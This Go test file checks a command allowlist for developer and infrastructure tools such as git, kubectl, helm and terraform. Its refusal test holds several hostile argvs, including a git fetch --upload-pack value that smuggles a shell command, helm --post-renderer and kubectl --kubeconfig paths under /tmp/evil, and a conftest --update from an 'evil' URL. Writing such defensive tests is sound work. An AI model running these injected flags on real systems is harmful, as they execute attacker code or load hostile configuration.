package exec

import (
	"slices"
	"strings"
	"testing"
)

// callSiteArgv is every distinct argv the test suite drove through any
// Execer when phase 54 measured it (temporary instrumentation, see
// .ai/phase-54/implementation-log.md), with temporary paths shortened
// to /tmp/X, and the row each one matched before phase 54. Declaring
// flags must never move a real call to a different row — or refuse it.
var callSiteArgv = []struct {
	argv     []string
	verb     string
	required []string
	class    Class
}{
	{[]string{"actionlint", "-format", "{{json .}}", "workflow.yml"}, "", []string(nil), ClassNone},
	{[]string{"act", "-n", "-W", "workflow.yml"}, "", []string{"-n"}, ClassNone},
	{[]string{"chainsaw", "test", "/render/suite", "--context", "kind-proj-1"}, "", []string(nil), ClassEphemeral},
	{[]string{"checkov", "--directory", ".", "--output", "json", "--compact", "--quiet"}, "", []string(nil), ClassNone},
	{[]string{"checkstyle", "-f", "xml", "."}, "", []string(nil), ClassNone},
	{[]string{"conftest", "test", "--policy", "/tmp/X", "--output", "json", "."}, "test", []string(nil), ClassNone},
	{[]string{"eslint", "--format", "json", "."}, "", []string(nil), ClassNone},
	{[]string{"git", "add", "-A"}, "add", []string(nil), ClassRepoWrite},
	{[]string{"git", "checkout", "-b", "feature/PROJ-1", "origin/main", "--"}, "checkout", []string(nil), ClassRepoWrite},
	{[]string{"git", "checkout", "feature/PROJ-1", "--"}, "checkout", []string(nil), ClassRepoWrite},
	{[]string{"git", "checkout", "main", "--"}, "checkout", []string(nil), ClassRepoWrite},
	{[]string{"git", "commit", "-m", "fix: a thing"}, "commit", []string(nil), ClassRepoWrite},
	{[]string{"git", "commit", "-m", "fix: a thing\n"}, "commit", []string(nil), ClassRepoWrite},
	{[]string{"git", "diff", "--end-of-options", "origin/main...HEAD"}, "diff", []string(nil), ClassRepoWrite},
	{[]string{"git", "diff", "--name-only", "--end-of-options", "origin/main...HEAD"}, "diff", []string(nil), ClassRepoWrite},
	{[]string{"git", "fetch", "--end-of-options", "origin", "main"}, "fetch", []string(nil), ClassRepoWrite},
	{[]string{"gitleaks", "detect", "--source", ".", "--no-git", "--report-format", "json", "--report-path", "/tmp/X", "--exit-code", "0"}, "detect", []string(nil), ClassNone},
	{[]string{"gitleaks", "detect", "--source", ".", "--no-git", "--report-format", "json", "--report-path", "/tmp/X", "--exit-code", "0", "--config", "/tmp/X"}, "detect", []string(nil), ClassNone},
	{[]string{"git", "ls-files", "--others", "--exclude-standard"}, "ls-files", []string(nil), ClassRepoWrite},
	{[]string{"git", "merge-base", "--end-of-options", "origin/main", "bugfix/PROJ-1"}, "merge-base", []string(nil), ClassRepoWrite},
	{[]string{"git", "merge-base", "--end-of-options", "origin/main", "feature/PROJ-1"}, "merge-base", []string(nil), ClassRepoWrite},
	{[]string{"git", "push", "-u", "--end-of-options", "origin", "bugfix/PROJ-1"}, "push", []string(nil), ClassRepoWrite},
	{[]string{"git", "push", "-u", "--end-of-options", "origin", "feature/PROJ-1"}, "push", []string(nil), ClassRepoWrite},
	{[]string{"git", "remote", "get-url", "origin"}, "remote get-url", []string(nil), ClassRepoWrite},
	{[]string{"git", "rev-list", "--count", "--end-of-options", "origin/main..main"}, "rev-list", []string(nil), ClassRepoWrite},
	{[]string{"git", "rev-parse", "--verify", "--end-of-options", "bugfix/PROJ-1"}, "rev-parse", []string(nil), ClassRepoWrite},
	{[]string{"git", "rev-parse", "--verify", "--end-of-options", "feature/PROJ-1"}, "rev-parse", []string(nil), ClassRepoWrite},
	{[]string{"git", "rev-parse", "--verify", "--end-of-options", "main"}, "rev-parse", []string(nil), ClassRepoWrite},
	{[]string{"git", "status", "--porcelain"}, "status", []string(nil), ClassRepoWrite},
	{[]string{"git", "worktree", "add", "-b", "feature/PROJ-1", "--end-of-options", "/tmp/X", "origin/main"}, "worktree add", []string(nil), ClassRepoWrite},
	{[]string{"git", "worktree", "add", "--detach", "--end-of-options", "/tmp/X", "cafebabe"}, "worktree add", []string(nil), ClassRepoWrite},
	{[]string{"git", "worktree", "add", "--detach", "--end-of-options", "/tmp/X", "deadbeef"}, "worktree add", []string(nil), ClassRepoWrite},
	{[]string{"gofmt", "-l", "."}, "", []string{"-l"}, ClassNone},
	{[]string{"gofmt", "-w", "."}, "", []string{"-w"}, ClassNone},
	{[]string{"golangci-lint", "run", "--output.json.path", "stdout", "--show-stats=false", "--path-mode", "abs", "./..."}, "run", []string(nil), ClassNone},
	{[]string{"golangci-lint", "run", "--output.json.path", "stdout", "--show-stats=false", "--path-mode", "abs", "--config", "/tmp/X", "./..."}, "run", []string(nil), ClassNone},
	{[]string{"go", "test", "-json", "./..."}, "test", []string(nil), ClassNone},
	{[]string{"gremlins", "unleash", "--output", ".ai-flow-gremlins-report.json", "."}, "unleash", []string(nil), ClassNone},
	{[]string{"gremlins", "unleash", "--output", ".ai-flow-gremlins-report.json", "./internal/baz"}, "unleash", []string(nil), ClassNone},
	{[]string{"gremlins", "unleash", "--output", ".ai-flow-gremlins-report.json", "./internal/foo"}, "unleash", []string(nil), ClassNone},
	{[]string{"helm", "diff", "upgrade", "demo", "testdata/chart", "--detailed-exitcode", "-f", "testdata/chart/values.yaml", "--kube-context", "prod-ctx"}, "diff upgrade", []string(nil), ClassReadOnlyLive},
	{[]string{"helm", "get", "manifest", "demo", "--kube-context", "prod-ctx"}, "get manifest", []string(nil), ClassReadOnlyLive},
	{[]string{"helm", "history", "demo", "--kube-context", "prod-ctx"}, "history", []string(nil), ClassReadOnlyLive},
	{[]string{"helm", "lint", "/tmp/X"}, "lint", []string(nil), ClassNone},
	{[]string{"helm", "template", "demo", "testdata/chart", "-f", "testdata/chart/values.yaml"}, "template", []string(nil), ClassNone},
	{[]string{"helm", "template", "novalues", "/tmp/X"}, "template", []string(nil), ClassNone},
	{[]string{"jenkins-cli", "declarative-linter", "-s", "https://jenkins.example/dev"}, "declarative-linter", []string(nil), ClassReadOnlyLive},
	{[]string{"jenkins-cli", "get-job", "acme.svc", "-s", "https://jenkins.example/dev"}, "get-job", []string(nil), ClassReadOnlyLive},
	{[]string{"kind", "create", "cluster", "--name", "proj-123", "--kubeconfig", "/tmp/X"}, "create cluster", []string(nil), ClassEphemeral},
	{[]string{"kind", "delete", "cluster", "--name", "proj-123", "--kubeconfig", "/tmp/X"}, "delete cluster", []string(nil), ClassEphemeral},
	{[]string{"kind", "get", "clusters", "-q"}, "get clusters", []string(nil), ClassNone},
	{[]string{"kubeconform", "-output", "json", "-summary", "."}, "", []string(nil), ClassNone},
	{[]string{"kubeconform", "-output", "json", "-summary", "rendered.yaml"}, "", []string(nil), ClassNone},
	{[]string{"kubectl", "apply", "-f", ".", "--dry-run=server", "-o", "json", "--context", "prod-ctx"}, "apply", []string{"--dry-run=server"}, ClassReadOnlyLive},
	{[]string{"kubectl", "auth", "can-i", "--list", "--context", "prod-ro"}, "auth can-i", []string{"--list"}, ClassReadOnlyLive},
	{[]string{"kubectl", "diff", "-f", ".", "--context", "prod-ctx"}, "diff", []string(nil), ClassReadOnlyLive},
	{[]string{"kubectl", "diff", "--server-side", "-f", ".", "--context", "prod-ctx"}, "diff", []string(nil), ClassReadOnlyLive},
	{[]string{"kubectl", "get", "-f", ".", "-o", "json", "--ignore-not-found", "--context", "prod-ctx"}, "get", []string(nil), ClassReadOnlyLive},
	{[]string{"kubectl", "rollout", "history", "Deployment/web", "-n", "default", "--context", "prod-ctx"}, "rollout history", []string(nil), ClassReadOnlyLive},
	{[]string{"kubectl", "rollout", "history", "StatefulSet/bare", "-n", "default", "--context", "prod-ctx"}, "rollout history", []string(nil), ClassReadOnlyLive},
	{[]string{"kustomize", "build", "base"}, "build", []string(nil), ClassNone},
	{[]string{"kustomize", "build", "broken"}, "build", []string(nil), ClassNone},
	{[]string{"kustomize", "build", "overlays/prod"}, "build", []string(nil), ClassNone},
	{[]string{"kuttl", "test", "/render/suite", "--context", "kind-proj-1"}, "", []string(nil), ClassEphemeral},
	{[]string{"kyverno", "apply", "/tmp/X", "--resource", ".", "--policy-report", "-o", "json"}, "apply", []string(nil), ClassNone},
	{[]string{"mutmut", "junitxml"}, "junitxml", []string(nil), ClassNone},
	{[]string{"mutmut", "run", "--paths-to-mutate", "pkg/add.py"}, "run", []string(nil), ClassNone},
	{[]string{"mvn", "org.pitest:pitest-maven:mutationCoverage", "-DtargetClasses=com.acme.Foo", "-DoutputFormats=XML"}, "org.pitest:pitest-maven:mutationCoverage", []string(nil), ClassNone},
	{[]string{"npx", "jest", "--ci", "--json"}, "jest", []string(nil), ClassNone},
	{[]string{"npx", "playwright", "test", "--reporter=json"}, "playwright test", []string(nil), ClassNone},
	{[]string{"npx", "playwright", "test", "--reporter=json", "--grep", "login"}, "playwright test", []string(nil), ClassNone},
	{[]string{"npx", "stryker", "run", "--mutate", "src/foo.ts", "--reporters", "json"}, "stryker run", []string(nil), ClassNone},
	{[]string{"prettier", "--check", "."}, "", []string{"--check"}, ClassNone},
	{[]string{"pytest", "--junitxml=.ai-flow-pytest-report.xml"}, "", []string(nil), ClassNone},
	{[]string{"ruff", "check", "--output-format", "json", "."}, "check", []string(nil), ClassNone},
	{[]string{"ruff", "format", "--check", "--config", "/tmp/X", "."}, "format", []string{"--check"}, ClassNone},
	{[]string{"ruff", "format", "--config", "/tmp/X", "."}, "format", []string(nil), ClassNone},
	{[]string{"terraform", "init", "-backend=false", "-input=false", "-no-color"}, "init", []string{"-backend=false"}, ClassNone},
	{[]string{"terraform", "init", "-input=false", "-no-color"}, "init", []string(nil), ClassReadOnlyLive},
	{[]string{"terraform", "plan", "-detailed-exitcode", "-out=.ai-flow-drift.tfplan", "-input=false", "-no-color", "-var-file=envs/dev.tfvars"}, "plan", []string{"-detailed-exitcode"}, ClassReadOnlyLive},
	{[]string{"terraform", "plan", "-out=.ai-flow-dryrun.tfplan", "-input=false", "-no-color"}, "plan", []string{"-out"}, ClassReadOnlyLive},                               // refused before phase 54: -out=<file> never satisfied required -out
	{[]string{"terraform", "plan", "-out=.ai-flow-dryrun.tfplan", "-input=false", "-no-color", "-var-file=envs/prod.tfvars"}, "plan", []string{"-out"}, ClassReadOnlyLive}, // refused before phase 54: -out=<file> never satisfied required -out
	{[]string{"terraform", "show", "-json", ".ai-flow-drift.tfplan"}, "show", []string{"-json"}, ClassNone},
	{[]string{"terraform", "show", "-json", ".ai-flow-dryrun.tfplan"}, "show", []string{"-json"}, ClassNone},
	{[]string{"terraform", "test", "-json", "-no-color", "-filter=err.tftest.hcl"}, "test", []string(nil), ClassEphemeral},
	{[]string{"terraform", "test", "-json", "-no-color", "-filter=main.tftest.hcl"}, "test", []string(nil), ClassEphemeral},
	{[]string{"terraform", "test", "-json", "-no-color", "-filter=nope.tftest.hcl"}, "test", []string(nil), ClassEphemeral},
	{[]string{"terraform", "test", "-json", "-no-color", "-filter=x.tftest.hcl"}, "test", []string(nil), ClassEphemeral},
	{[]string{"terraform", "validate", "-no-color"}, "validate", []string(nil), ClassNone},
	{[]string{"terraform", "workspace", "select", "dev"}, "workspace select", []string(nil), ClassReadOnlyLive},
	{[]string{"terraform", "workspace", "select", "prod"}, "workspace select", []string(nil), ClassReadOnlyLive},
	{[]string{"tflint", "--format", "json"}, "", []string(nil), ClassNone},
	{[]string{"trivy", "config", "--format", "json", "."}, "config", []string(nil), ClassNone},
	{[]string{"zizmor", "--format", "json", "."}, "", []string(nil), ClassNone},
}

// TestCallSiteArgvMatchExpectedRows: every recorded call-site argv
// still matches, and matches the same row (verb, required flags, class).
func TestCallSiteArgvMatchExpectedRows(t *testing.T) {
	al := NewAllowlist(Table...)
	for _, c := range callSiteArgv {
		r, ok := al.Match(c.argv)
		if !ok {
			t.Errorf("refused: %q", c.argv)
			continue
		}
		if strings.Join(r.Verb, " ") != c.verb || !slices.Equal(r.RequiredFlags, c.required) || r.Class != c.class {
			t.Errorf("%q matched %s %v %v %s, want %s %v %s", c.argv, r.Tool, r.Verb, r.RequiredFlags, r.Class, c.verb, c.required, c.class)
		}
	}
}

// TestEveryRowDeclaresItsFlags: no row is left undecided — an empty
// flag set is written []string{} — and every value flag is a declared
// flag.
func TestEveryRowDeclaresItsFlags(t *testing.T) {
	for _, r := range Table {
		if r.Flags == nil {
			t.Errorf("%s %v: Flags is nil; declare the flags its callers pass, or []string{}", r.Tool, r.Verb)
		}
		for _, v := range r.ValueFlags {
			if !slices.Contains(r.Flags, v) {
				t.Errorf("%s %v: value flag %s is not in Flags", r.Tool, r.Verb, v)
			}
		}
	}
}

// TestUndeclaredFlagIsRefused: a flag no caller of the row passes is
// refused wherever it appears before the end of options — the general
// form of the 2026-09-27 git fetch --upload-pack reproduction.
func TestUndeclaredFlagIsRefused(t *testing.T) {
	al := NewAllowlist(Table...)
	for _, argv := range [][]string{
		{"git", "fetch", "origin", "--upload-pack=touch /tmp/PWNED && git-upload-pack"},
		{"git", "fetch", "--upload-pack", "evil", "--end-of-options", "origin", "main"},
		{"git", "push", "-u", "--force", "--end-of-options", "origin", "feature/PROJ-1"},
		{"git", "commit", "--amend", "-m", "x"},
		{"kubectl", "diff", "-f", ".", "--context", "prod", "--kubeconfig=/tmp/evil"},
		{"kubectl", "get", "-f", ".", "-o", "json", "--token", "x"},
		{"helm", "template", "demo", "chart", "--post-renderer", "/tmp/evil"},
		{"terraform", "plan", "-out=x.tfplan", "-input=false", "-no-color", "-var", "a=b"},
		{"gitleaks", "detect", "--source", ".", "--no-git", "--redact=false"},
		{"conftest", "test", "--policy", "p", "--update", "https://evil/x", "."},
	} {
		if r, ok := al.Match(argv); ok {
			t.Errorf("%q matched %s %v; an undeclared flag must be refused", argv, r.Tool, r.Verb)
		}
	}
}

// TestFlagChecksStopAtEndOfOptions: after "--" or "--end-of-options"
// every argument is positional — what the tools themselves do with it.
func TestFlagChecksStopAtEndOfOptions(t *testing.T) {
	al := NewAllowlist(Table...)
	for _, argv := range [][]string{
		{"git", "checkout", "main", "--", "--orphan"},
		{"git", "fetch", "--end-of-options", "origin", "--upload-pack=x"},
	} {
		if _, ok := al.Match(argv); !ok {
			t.Errorf("%q refused; arguments after the end of options are positional", argv)
		}
	}
}

// TestValueFlagSkipsItsValue: git commit -m takes the next argument as
// the message even when it starts with "-"; that is content, not a flag.
func TestValueFlagSkipsItsValue(t *testing.T) {
	al := NewAllowlist(Table...)
	if _, ok := al.Match([]string{"git", "commit", "-m", "--amend: a message that starts with dashes"}); !ok {
		t.Error("a commit message starting with -- was refused")
	}
}

// TestRequiredBareFlagAcceptsEverySpelling: a required flag without a
// value is satisfied by -flag=value too — terraform's own spelling for
// plan -out, which was refused before phase 54.
func TestRequiredBareFlagAcceptsEverySpelling(t *testing.T) {
	r, ok := NewAllowlist(Table...).Match([]string{"terraform", "plan", "-out=.ai-flow-dryrun.tfplan", "-input=false", "-no-color"})
	if !ok || !slices.Equal(r.RequiredFlags, []string{"-out"}) {
		t.Errorf("terraform plan -out=<file>: matched %v %v, want the -out row", ok, r.RequiredFlags)
	}
}
